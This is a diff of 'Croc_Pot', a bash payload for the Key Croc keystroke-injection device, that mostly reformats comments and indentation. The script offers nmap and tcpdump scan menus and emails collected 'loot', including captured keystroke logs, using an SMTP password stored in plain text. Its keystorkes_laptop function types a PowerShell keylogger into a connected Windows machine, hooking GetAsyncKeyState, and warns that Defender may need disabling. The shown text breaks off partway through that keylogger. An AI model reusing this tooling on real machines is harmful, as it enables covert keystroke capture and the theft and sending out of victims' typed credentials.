@@ -4,39 +4,33 @@
 # Title:         Croc_Pot
 # Description:   Email KeyCroc INFO & Log files & Nmap scan Plus save to loot folder and more
 # Author:        Spywill
-# Version:       1.3.0
+# Version:       1.3.2
 # Category:      Key Croc
 ##
-
 ##
-# Payload  Variables
+#----Payload  Variables
 ##
-
 CROC_FOLDER=/root/udisk/loot/Croc_Pot
 CROC_FOLDER_A=/root/udisk/tools/Croc_Pot
 DATE=$(date +%b-%d-%y---%r)
 LINE=$(perl -e 'print "=" x 80,"\n"')
 LINE_=$(perl -e 'print "*" x 10,"\n"')
 LINE_A=$(perl -e 'print "-" x 15,"\n"')
-
 ##
-# Create folder
+#----Create folder
 ##
-
 if [[ -d "${CROC_FOLDER}" && "${CROC_FOLDER_A}" ]]; then
-		LED B
-		sleep 1
+	LED B
+	sleep 1
 else
-		LED SETUP
-		sleep 1
-		mkdir -p ${CROC_FOLDER} ${CROC_FOLDER_A}
-		LED FINISH
+	LED SETUP
+	sleep 1
+	mkdir -p ${CROC_FOLDER} ${CROC_FOLDER_A}
+	LED FINISH
 fi
-
 ##
-# Color  Variables
+#----Color  Variables
 ##
-
 green='\e[32m'
 blue='\e[34m'
 red='\e[31m'
@@ -44,11 +38,9 @@ white='\e[97m'
 yellow='\e[93m'
 background='\e[40m'
 clear='\e[0m'
-
 ##
-# Color Functions
+#----Color Functions
 ##
-
 ColorGreen() {
 	echo -ne $green$1$clear
 }
@@ -61,199 +53,166 @@ ColorYellow() {
 ColorRed() {
 	echo -ne $red$1$clear
 }
-
 ##
-# All Menu color Functions
+#----All Menu color Functions
 ##
-
 MenuTitle() {
 	echo -ne "\n\t\t\t\e[41;4;1m${1} ${2} ${3} ${4} ${5}${clear}\n"
 }
-
 MenuColor() {
 	echo -ne "\t\t\t\e[40;1m${1}${clear}${green})${clear}\e[40;38;5;202;4m${2} ${3} ${4} ${5} ${6} ${7}"
 }
-
 MenuEnd() {
 	echo -ne "\t\t\t\e[40;1m0${clear}${green})${clear}\e[40;4;32mEXIT              ⮊${clear}
 \t\t\e[40m$(ColorBlue 'CHOOSE AN OPTION AND PRESS [ENTER]:') ${clear}"
 }
-
 Info_Screen() {
 	echo -ne "\n\e[48;5;202;30m${LINE}${clear}\n"
 	echo -ne $background$yellow$1$clear
 	echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
 }
-
 ##
-# Payload Functions
+#----Payload Functions
 ##
-
 function croc_title() {
 	
 enternet_test() {
 	wget -q --spider http://google.com
-	if [ $? -eq 0 ]; then
-		echo -ne "${green}Online "
-	else
-		echo -ne "${red}Offline"
-	fi
+if [ $? -eq 0 ]; then
+	echo -ne "${green}Online "
+else
+	echo -ne "${red}Offline"
+fi
 }
 	echo -ne "\n\n\e[41;38;5;232m${LINE}${clear}
 \e[40;31m${LINE_A}${clear}\e[40m»${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m❺ ${clear}\e[40m«${clear}\e[40;31m---------${clear}\e[41;38;5;232m♁${clear}\e[40m${yellow} KeyCroc IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(enternet_test)      ${clear}
 \e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}\e[40m${yellow} KeyCroc VER: $(cat /root/udisk/version.txt)                   ${clear}
 \e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}${clear}\e[41;38;5;232mΩ${clear}\e[40m${yellow} KeyCroc keyboard: $(sed -n 9p /root/udisk/config.txt)        ${clear}
-\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.3.0\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP: $(cat /sys/class/thermal/thermal_zone0/temp)°C  USAGE: $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')           ${clear}
+\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.3.2\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
 \e[41;38;5;232m${LINE}${clear}\n\n"	
 }
-
 function croc_title_loot() {
 	echo -ne "\n${LINE}\n\t${LINE_A}>KEYCROC-HAK5<${LINE_A}\n\t\tDEVELOPED BY SPYWILL\n\t\tDATE OF SCAN-${DATE}\n\t${LINE_A}>CROC_POT<${LINE_A}\n${LINE}\n\n"
 }
-
 function invalid_entry() {
 	LED R
 	echo -ne "\n\t${LINE_}\e[40;5m$(ColorRed 'INVALID ENTRY PLEASE TRY AGAIN')${clear}${LINE_}\n"
 }
-
 ##
-#   - Nmap mean
+#----Nmap mean
 ##
-
 function nmap_menu() {
 	IP_WLAN=$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
 	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
 	echo -ne "$(Info_Screen '
 -Start some basic nmap scan and save to loot folder\n
 -Enter IP for scan or default IP is 192.168.1.*\n')${clear}\n"
-
 ##
-#   - Nmap Function
-#   - User IP Input Function
+#----Nmap Function
+#----User IP Input Function
 ##
-
 user_ip_f() {
 	read -p "$(ColorBlue 'ENTER IP TO USE FOR NMAP SCAN AND PRESS [ENTER]'): " USER_IP
-	if [[ "${USER_IP}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
-		IP_SETUP=${USER_IP}
-		echo -ne "\t${LINE_}\e[40m$(ColorGreen 'USING IP THAT WAS ENTER')${clear}${IP_SETUP}\n"
-	else
-		echo -ne "\t${LINE_}\e[40;4m$(ColorRed 'USING DEFAULT IP 192.168.1.*')${clear}${LINE_}\n"
-		IP_SETUP=192.168.1.*
-	fi
+if [[ "${USER_IP}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
+	IP_SETUP=${USER_IP}
+	echo -ne "\t${LINE_}\e[40m$(ColorGreen 'USING IP THAT WAS ENTER')${clear}${IP_SETUP}\n"
+else
+	echo -ne "\t${LINE_}\e[40;4m$(ColorRed 'USING DEFAULT IP 192.168.1.*')${clear}${LINE_}\n"
+	IP_SETUP=192.168.1.*
+fi
 }
-
 ##
-#  -Nmap Regular Scan Functions
+#----Nmap Regular Scan Functions
 ##
-
 regular_scan() {
 	LED ATTACK
 	user_ip_f
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP REGULAR SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
-
 ##
-#  -Nmap Quick_Scan Functions
+#----Nmap Quick_Scan Functions
 ##
-
 quick_scan() {
 	LED ATTACK
 	user_ip_f
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP QUICK SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -T4 -F ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
-
 ##
-#  -Nmap Quick_Plus Scan Functions
+#----Nmap Quick_Plus Scan Functions
 ##
-
 quick_plus_scan() {
 	LED ATTACK
 	user_ip_f
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP QUICK_PLUS SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -sV -T4 -O -F --version-light ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
-
 ##
-#  -Nmap Ping Scan Functions
+#----Nmap Ping Scan Functions
 ##
-
 ping_scan() {
 	LED ATTACK
 	user_ip_f
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PING SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -sn ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
-
 ##
-#  -Nmap Intense Scan Functions
+#----Nmap Intense Scan Functions
 ##
-
 intense_scan() {
 	LED ATTACK
 	user_ip_f
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP INTENSE SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap -T4 -A -v ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
-
 ##
-#  -Nmap Interface Scan Functions
+#----Nmap Interface Scan Functions
 ##
-
 interface_scan() {
 	LED ATTACK
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP INTERFACE SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --iflist | tee -a ${LOOT_NMAP} 
 }
-
 ##
-#  -Nmap Port Scan Functions
+#----Nmap Port Scan Functions
 ##
-
 port_scan() {
 	LED ATTACK
 	user_ip_f
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PORT SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap --top-ports 20 ${IP_WLAN} ${IP_SETUP} | tee -a ${LOOT_NMAP}
 }
-
 ##
-#  -Nmap Personal Scan Functions
+#----Nmap Personal Scan Functions
 ##
-
 personal_scan() {
 	LED ATTACK
 	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}NMAP PERSONAL SCAN${LINE_}\n" ; echo -n " $(ColorBlue 'ENTER YOUR NMAP SCAN SETTING THEN PRESS [ENTER]'): " ; read PER_SCAN && ${PER_SCAN} | tee -a ${LOOT_NMAP}
 }
-
 ##
-#  -Nmap Connected Pc Scan Functions
+#----Nmap Connected Pc Scan Functions
 ##
-
 pc_scan() {
 	local CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
 	local croc_os_v=/root/udisk/loot/Croc_OS_ip.txt
-	if [ -e "${CROC_OS_WIND}" ]; then
-		croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(sed -n 4p ${CROC_OS_WIND}) | tee -a ${LOOT_NMAP}
-	else
-	if [ -e "${croc_os_v}" ]; then
-		croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(sed -n 2p ${croc_os_v}) | tee -a ${LOOT_NMAP}
-	else
-		echo -ne "\n\t\e[40m$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET PC USER NAME AND IP')${clear}\n"
-	fi
+if [ -e "${CROC_OS_WIND}" ]; then
+	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(sed -n 4p ${CROC_OS_WIND}) | tee -a ${LOOT_NMAP}
+else
+if [ -e "${croc_os_v}" ]; then
+	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(sed -n 2p ${croc_os_v}) | tee -a ${LOOT_NMAP}
+else
+	echo -ne "\n\t\e[40m$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET PC USER NAME AND IP')${clear}\n"
+fi
 fi
 }
-
 ##
-#   - Nmap Scan Menu
+#----Nmap Scan Menu
 ##
-
 LED B
 MenuTitle NMAP MENU
-MenuColor  1 REGULAR SCAN ; echo -ne "      ${clear}\n"
-MenuColor  2 QUICK SCAN ; echo -ne "        ${clear}\n"
-MenuColor  3 QUICK PLUS ; echo -ne "        ${clear}\n"
-MenuColor  4 PING SCAN ; echo -ne "         ${clear}\n"
-MenuColor  5 INTENSE SCAN ; echo -ne "      ${clear}\n"
-MenuColor  6 INTERFACE SCAN ; echo -ne "    ${clear}\n"
-MenuColor  7 PORT SCAN ; echo -ne "         ${clear}\n"
-MenuColor  8 PERSONAL SCAN ; echo -ne "     ${clear}\n"
-MenuColor  9 CONNECTED PC SCAN ; echo -ne "  ${clear}\n"
+MenuColor 1 REGULAR SCAN ; echo -ne "      ${clear}\n"
+MenuColor 2 QUICK SCAN ; echo -ne "        ${clear}\n"
+MenuColor 3 QUICK PLUS ; echo -ne "        ${clear}\n"
+MenuColor 4 PING SCAN ; echo -ne "         ${clear}\n"
+MenuColor 5 INTENSE SCAN ; echo -ne "      ${clear}\n"
+MenuColor 6 INTERFACE SCAN ; echo -ne "    ${clear}\n"
+MenuColor 7 PORT SCAN ; echo -ne "         ${clear}\n"
+MenuColor 8 PERSONAL SCAN ; echo -ne "     ${clear}\n"
+MenuColor 9 CONNECTED PC SCAN ; echo -ne "  ${clear}\n"
 MenuColor 10 RETURN TO MAIN MENU ; echo -ne "${clear}\n"
 MenuEnd
 	read d
@@ -272,25 +231,23 @@ MenuEnd
 	*) invalid_entry ; nmap_menu ;;
 	esac
 }
-
 ##
-#   - Key Croc Log mean
+#----Key Croc Log mean
 ##
-
 function croc_logs_mean() {
 	local LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
 	LED B
 	croc_title
 MenuTitle KEYCROC LOG MENU
-MenuColor  1 MESSAGES LOG ; echo -ne "       ${clear}\n"
-MenuColor  2 KERNEL LOG ; echo -ne "         ${clear}\n"
-MenuColor  3 SYSTEM LOG ; echo -ne "         ${clear}\n"
-MenuColor  4 SYSSTAT LOG ; echo -ne "        ${clear}\n"
-MenuColor  5 DEBUG LOG ; echo -ne "          ${clear}\n"
-MenuColor  6 DPKG LOG ; echo -ne "           ${clear}\n"
-MenuColor  7 NTPSTATS LOG ; echo -ne "       ${clear}\n"
-MenuColor  8 AUTH LOG ; echo -ne "           ${clear}\n"
-MenuColor  9 DMESG LOG ; echo -ne "          ${clear}\n"
+MenuColor 1 MESSAGES LOG ; echo -ne "       ${clear}\n"
+MenuColor 2 KERNEL LOG ; echo -ne "         ${clear}\n"
+MenuColor 3 SYSTEM LOG ; echo -ne "         ${clear}\n"
+MenuColor 4 SYSSTAT LOG ; echo -ne "        ${clear}\n"
+MenuColor 5 DEBUG LOG ; echo -ne "          ${clear}\n"
+MenuColor 6 DPKG LOG ; echo -ne "           ${clear}\n"
+MenuColor 7 NTPSTATS LOG ; echo -ne "       ${clear}\n"
+MenuColor 8 AUTH LOG ; echo -ne "           ${clear}\n"
+MenuColor 9 DMESG LOG ; echo -ne "          ${clear}\n"
 MenuColor 10 BOOTSTRAP LOG ; echo -ne "     ${clear}\n"
 MenuColor 11 ALTERNATIVES LOG ; echo -ne "  ${clear}\n"
 MenuColor 12 MAIL INFO LOG ; echo -ne "      ${clear}\n"
@@ -319,11 +276,9 @@ MenuEnd
 	*) invalid_entry ; croc_logs_mean ;;
 	esac
 }
-
 ##
-#   - Croc mail menu/function
+#----Croc mail menu/function
 ##
-
 function croc_mail() {
 	clear
 	local PYTHON_MAIL=/root/udisk/tools/Croc_Pot/Croc_Mail.py
@@ -339,11 +294,9 @@ function croc_mail() {
 -Enter the e-mail to send to\n
 -Enter MESSAGE\n
 -Add Attachment\n')${clear}\n\n"
-
 ##
-#  -User Smtp input Functions
+#----User Smtp input Functions
 ##
-
 user_smtp() {
 MenuTitle SELECT EMAIL PROVIDER
 MenuColor 1 GMAIL ; echo -ne "            ${clear}\n"
@@ -359,17 +312,13 @@ MenuEnd
 	*) invalid_entry ; user_smtp ;;
 	esac
 }
-
 ##
-#  -User E-mail input Functions
+#----User E-mail input Functions
 ##
-
 user_email_set() {
-
 ##
-#  -Replace user input with Asterisk (*)
+#----Replace user input with Asterisk (*)
 ##
-
 user_input_passwd() {
 	unset password
 	unset chartCount
@@ -380,49 +329,44 @@ user_input_passwd() {
 		break ;;
 	$'\177')
 		if [ ${#password} -gt 0 ]; then
-				echo -ne "\b \b"
-				password=${password::-1}
-			 fi ;;
-		  *)
-			chartCount=$((chartCount+1))
-			echo -n '*'
-			password+="$char" ;;
+		echo -ne "\b \b"
+		password=${password::-1}
+		fi ;;
+	*)
+		chartCount=$((chartCount+1))
+		echo -n '*'
+		password+="$char" ;;
 	esac
 done
 echo $password >> ${USER_CR}
 echo ""
 }
-
 read -p "$(ColorBlue 'ENTER YOUR EMAIL AND PRESS [ENTER]:') " E_MAIL_MY ; echo ${E_MAIL_MY} >> ${USER_CR}
 user_input_passwd
 read -p "$(ColorBlue 'ENTER EMAIL TO SEND LOOT TO AND PRESS [ENTER]:') " E_MAIL_SEND ; echo ${E_MAIL_SEND} >> ${USER_CR}
 }
-
 ##
-#  -Python file send Functions
+#----Python file send Functions
 ##
-
 mail_file() {
 	clear
 python_v() {
-		FILE_A_B="file_location_${CHANGE_FILE} ="
-		FILE_B_B="filename_${CHANGE_FILE} = os.path.basename(file_location_${CHANGE_FILE})"
-		FILE_C_B="attachment_${CHANGE_FILE} = open(file_location_${CHANGE_FILE}, 'rb')"
-		FILE_D_B="part_${CHANGE_FILE} = MIMEBase('application', 'octet-stream')"
-		FILE_E_B="part_${CHANGE_FILE}.set_payload(attachment_${CHANGE_FILE}.read())"
-		FILE_F_B="encoders.encode_base64(part_${CHANGE_FILE})"
-		FILE_G_B="part_${CHANGE_FILE}.add_header('Content-Disposition', \"attachment; filename= %s\" % filename_${CHANGE_FILE})"
-		FILE_H_B="msg.attach(part_${CHANGE_FILE})"
-		FILE_I_B="${CHANGE_FILE_A}"
+	FILE_A_B="file_location_${CHANGE_FILE} ="
+	FILE_B_B="filename_${CHANGE_FILE} = os.path.basename(file_location_${CHANGE_FILE})"
+	FILE_C_B="attachment_${CHANGE_FILE} = open(file_location_${CHANGE_FILE}, 'rb')"
+	FILE_D_B="part_${CHANGE_FILE} = MIMEBase('application', 'octet-stream')"
+	FILE_E_B="part_${CHANGE_FILE}.set_payload(attachment_${CHANGE_FILE}.read())"
+	FILE_F_B="encoders.encode_base64(part_${CHANGE_FILE})"
+	FILE_G_B="part_${CHANGE_FILE}.add_header('Content-Disposition', \"attachment; filename= %s\" % filename_${CHANGE_FILE})"
+	FILE_H_B="msg.attach(part_${CHANGE_FILE})"
+	FILE_I_B="${CHANGE_FILE_A}"
 }
-
 ##
-#  - Mail Nmap Functions
+#----Mail Nmap Functions
 ##
-
 send_file_a() {
 	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
-	if [ -e "${LOOT_NMAP}" ]; then
+if [ -e "${LOOT_NMAP}" ]; then
 	local CHANGE_FILE="C"
 	local CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt'"
 	python_v
@@ -432,14 +376,12 @@ else
 	nmap_menu
 fi
 }
-
 ##
-#  - Mail KeyCroc Log Functions
+#----Mail KeyCroc Log Functions
 ##
-
 send_file_b() {
 	local LOOT_LOG=/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt
-	if [ -e "${LOOT_LOG}" ]; then
+if [ -e "${LOOT_LOG}" ]; then
 	local CHANGE_FILE="B"
 	local CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_LOG.txt'"
 	python_v
@@ -449,14 +391,12 @@ else
 	croc_logs_mean
 fi
 }
-
 ##
-#  - Mail Windows Log Functions
+#----Mail Windows Log Functions
 ##
-
 send_file_c() {
 	local LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
-	if [ -e "${LOOT_WIND}" ]; then
+if [ -e "${LOOT_WIND}" ]; then
 	local CHANGE_FILE=""
 	local CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt'"
 	python_v
@@ -466,14 +406,12 @@ else
 	croc_pot_plus
 fi
 }
-
 ##
-#  - Mail Keycroc Info
+#----Mail Keycroc Info
 ##
-
 send_file_d() {
 	local LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
-	if [ -e "${LOOT_INFO}" ]; then
+if [ -e "${LOOT_INFO}" ]; then
 	local CHANGE_FILE="D"
 	local CHANGE_FILE_A="'/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt'"
 	python_v
@@ -483,14 +421,12 @@ else
 	croc_status
 fi
 }
-
 ##
-#  - Mail Attachment Function
+#----Mail Attachment Function
 ##
-
 send_file_e() {
 	read -p "$(ColorBlue 'ENTER THE PATH OF YOUR ATTACHMENT AND PRESS [ENTER]:') " ATT_PATH
-	if [ -e "${ATT_PATH}" ]; then
+if [ -e "${ATT_PATH}" ]; then
 	local CHANGE_FILE="P"
 	local CHANGE_FILE_A="'${ATT_PATH}'"
 	python_v
@@ -499,14 +435,12 @@ else
 	echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed 'FILE DOES NOT EXIST PLEASE TRY AGAIN')${clear}${LINE_}\n"
 fi
 }
-
 ##
-#  - Mail keystorkes Function
+#----Mail keystorkes Function
 ##
-
 send_file_f() {
 	local KEY_ST=/root/udisk/loot/croc_char.log
-	if [ -e "${KEY_ST}" ]; then
+if [ -e "${KEY_ST}" ]; then
 	local CHANGE_FILE="F"
 	local CHANGE_FILE_A="'/root/udisk/loot/croc_char.log'"
 	python_v
@@ -515,11 +449,9 @@ else
 	echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'DID NOT FIND croc_char.log')${clear}"${LINE_}
 fi
 }
-
 ##
-#   - Croc Mail Select File Menu
+#----Croc Mail Select File Menu
 ##
-
 MenuTitle SELECT FILE TO E-MAIL
 MenuColor 1 NMAP SCAN ; echo -ne "         ${clear}\n"
 MenuColor 2 KEYCROC LOG ; echo -ne "       ${clear}\n"
@@ -542,11 +474,9 @@ MenuEnd
 	*) invalid_entry ; mail_file ;;
 	esac
 }
-
 ##
-#  - Python E-mail Functions
+#----Python E-mail Functions
 ##
-
 python_email() {
 local USER_EMAL=$(sed -n 2p ${USER_CR})
 local USER_PASSWD=$(sed -n 3p ${USER_CR})
@@ -564,98 +494,95 @@ text = msg.as_string()\nserver.sendmail(email, send_to_email, text)\nserver.quit
 sleep 1
 python ${PYTHON_MAIL}
 }
-
+##
+#----Croc Mail check for existing email
+##
 if [ -e "${USER_CR}" ]; then
 	echo -ne "\e[40m$(ColorBlue 'WOULD YOU LIKE TO USE EXISTING EMAIL SETTING TYPE YES OR NO AND PRESS [ENTER]:')${clear} "; read EMAIL_SETTING
 	case $EMAIL_SETTING in
 	[yY] | [yY][eE][sS])
-						echo -ne "\n${LINE_}\e[40m$(ColorGreen 'KEEPING EXISTING EMAIL SETTING')${clear}${LINE_}\n\n" ;;
-	    [nN] | [nN][oO])
-						rm ${USER_CR}
-						user_smtp
-						user_email_set ;;
-					  *)
-						invalid_entry ; croc_mail ;;
-    esac
+		echo -ne "\n${LINE_}\e[40m$(ColorGreen 'KEEPING EXISTING EMAIL SETTING')${clear}${LINE_}\n\n" ;;
+	[nN] | [nN][oO])
+		rm ${USER_CR}
+		user_smtp
+		user_email_set ;;
+	*)
+		invalid_entry ; croc_mail ;;
+esac
 else
-	echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed 'NO EXISTING EMAIL SETTING WERE FOUND PLEASE ENTER YOUR EMAIL SETTING')${clear}${LINE_}\n\n"
-	user_smtp
-	user_email_set
+		echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed 'NO EXISTING EMAIL SETTING WERE FOUND PLEASE ENTER YOUR EMAIL SETTING')${clear}${LINE_}\n\n"
+		user_smtp
+		user_email_set
 fi
+##
+#----Croc Mail add personal message
+##
 	read -p "$(ColorBlue 'ENTER A PERSONAL MESSAGE YES OR NO AND PRESS [ENTER]:') " MAIL_MESS
 	case $MAIL_MESS in
 	[yY] | [yY][eE][sS])
-						unset MY_MESS_A
-						unset DEF_MESS
-						read -p "$(ColorBlue 'ENTER YOUR MESSAGE AND PRESS [ENTER]:') " MY_MESS ;;
-	    [nN] | [nN][oO])
-						unset MY_MESS
-						local DEF_MESS=$(perl -e 'print "KEYCROC-HAK5---DEVELOPED BY SPYWILL ---Croc_Mail"')
-						local MY_MESS_A=${DEF_MESS} ;;
-					  *)
-						invalid_entry ;;
+		unset MY_MESS_A
+		unset DEF_MESS
+		read -p "$(ColorBlue 'ENTER YOUR MESSAGE AND PRESS [ENTER]:') " MY_MESS ;;
+	[nN] | [nN][oO])
+		unset MY_MESS
+		local DEF_MESS=$(perl -e 'print "KEYCROC-HAK5---DEVELOPED BY SPYWILL ---Croc_Mail"')
+		local MY_MESS_A=${DEF_MESS} ;;
+	*)
+		invalid_entry ;;
 esac
-    read -p "$(ColorBlue 'ADD ATTACHMENT ENTER YES OR NO AND PRESS [ENTER]:') " MAIL_MESS
+##
+#----Croc Mail add attachment to email
+##
+	read -p "$(ColorBlue 'ADD ATTACHMENT ENTER YES OR NO AND PRESS [ENTER]:') " MAIL_MESS
 	case $MAIL_MESS in
 	[yY] | [yY][eE][sS])
-						mail_file ;;
-		[nN] | [nN][oO])
-						echo -ne "\n\e[40m$(ColorGreen 'SENDING EMAIL')${clear}\n" ;;
-					  *)
-						invalid_entry ; mail_file ;;
+		mail_file ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorGreen 'SENDING EMAIL')${clear}\n" ;;
+	*)
+		invalid_entry ; mail_file ;;
 esac
 python_email
 main_menu
 }
-
 ##
-#   - Croc pot plus menu 
+#----Croc pot plus menu 
 ##
-
 function croc_pot_plus() {
 	LED B
 	croc_title
-
 ##
-#   - Tcpdump  Function
+#----Tcpdump  Function
 ##
-
 tcpdump_scan() {
 	local LOOT_TCPDUMP=/root/udisk/loot/Croc_Pot/tcpdump.pcap
 	rm -f ${LOOT_TCPDUMP}
 	echo -ne "$(Info_Screen '
 -THIS WILL START TCPDUMP SCAN AND SAVE TO LOOT FOLDER\n
 -PRESS CTRL + C TO STOP TCPDUMP SCAN\n')${clear}\n"
-
 interface_tcpdump() {
 	LED ATTACK
 	tcpdump -D | tee ${LOOT_TCPDUMP}
 }
-
 hex_ascII_tcpdump() {
 	LED ATTACK
 	tcpdump -XX -i any | tee ${LOOT_TCPDUMP}
 }
-
 ip_tcpdump() {
 	LED ATTACK
 	tcpdump -n -i any | tee ${LOOT_TCPDUMP}
 }
-
 current_tcpdump() {
 	LED ATTACK
 	tcpdump | tee ${LOOT_TCPDUMP}
 }
-
 user_tcpdump() {
 	LED ATTACK
 	echo -ne "\n$(ColorBlue 'ENTER TCPDUMP SCAN THEN PRESS [ENTER]:') "; read TCPDUMP_SCAN && ${TCPDUMP_SCAN} | tee ${LOOT_TCPDUMP}
 }
-
 ##
-#   - Tcpdump Scan Menu
+#----Tcpdump Scan Menu
 ##
-
 MenuTitle TCPDUMP SCAN MENU
 MenuColor 1 TCPDUMP INTERFACE SCAN ; echo -ne "        ${clear}\n"
 MenuColor 2 TCPDUMP PACKETS IN HEX AND ASCll ; echo -ne " ${clear}\n"
@@ -676,11 +603,9 @@ MenuEnd
 	*) invalid_entry ; tcpdump_scan ;;
 	esac
 }
-
 ##
-#   - Windows laptop keystorkes Function
+#----Windows laptop keystorkes Function
 ##
-
 keystorkes_laptop() {
 	local CROC_OS=/root/udisk/loot/Croc_OS.txt
 	local OS_CHECK=$(sed -n 1p ${CROC_OS})
@@ -690,7 +615,7 @@ keystorkes_laptop() {
 -May need to disenable windows defender for this to work\n
 -TO STOP THE PAYLOAD PRESS Ctrl + c\n
 -When stop this will open up notepad and save to loot/Croc_Pot\n')${clear}\n"
-	if [ "${OS_CHECK}" = WINDOWS ]; then
+if [ "${OS_CHECK}" = WINDOWS ]; then
 	ATTACKMODE HID STORAGE
 	sleep 5
 	Q GUI r
@@ -706,7 +631,7 @@ keystorkes_laptop() {
 	Q STRING "{"
 	Q ENTER
 ##
-#   -API declaration
+#----API declaration
 ##
 	Q STRING  "\$APIsignatures = @'"
 	Q ENTER
@@ -731,7 +656,7 @@ keystorkes_laptop() {
 	Q STRING "\$API = Add-Type -MemberDefinition \$APIsignatures -Name 'Win32' -Namespace API -PassThru"
 	Q ENTER
 ##
-#  -output file
+#----output file
 ##
 	Q STRING "\$no_output = New-Item -Path \$LOOTDIR -ItemType File -Force"
 	Q ENTER
@@ -748,24 +673,24 @@ keystorkes_laptop() {
 	Q STRING "for (\$ascii = 9; \$ascii -le 254; \$ascii++) {"
 	Q ENTER
 ##
-#  -get key state
+#----get key state
 ##
 	Q STRING "\$keystate = \$API::GetAsyncKeyState(\$ascii)"
 	Q ENTER
 ##
-#  -if key pressed
+#----if key pressed
 ##
 	Q STRING "if (\$keystate -eq -32767) {"
 	Q ENTER
 	Q STRING "\$null = [console]::CapsLock"
 	Q ENTER
 ##
-#  -translate code
+#----translate code
 ##
 	Q STRING "\$virtualKey = \$API::MapVirtualKey(\$ascii, 3)"
 	Q ENTER
 ##
-#  -get keyboard state and create stringbuilder
+#----get keyboard state and create stringbuilder
 ##
 	Q STRING "\$kbstate = New-Object Byte[] 256"
 	Q ENTER
@@ -774,14 +699,14 @@ keystorkes_laptop() {
 	Q STRING "\$loggedchar = New-Object -TypeName System.Text.StringBuilder"
 	Q ENTER
 ##
-#  -translate virtual key
-##          
+#----translate virtual key
+##
 	Q STRING "if (\$API::ToUnicode(\$ascii, \$virtualKey, \$kbstate, \$loggedchar, \$loggedchar.Capacity, 0))"
 	Q ENTER 
 	Q STRING "{"
 	Q ENTER
 ##
-#  -if success, add key to logger file
+#----if success, add key to logger file
 ##
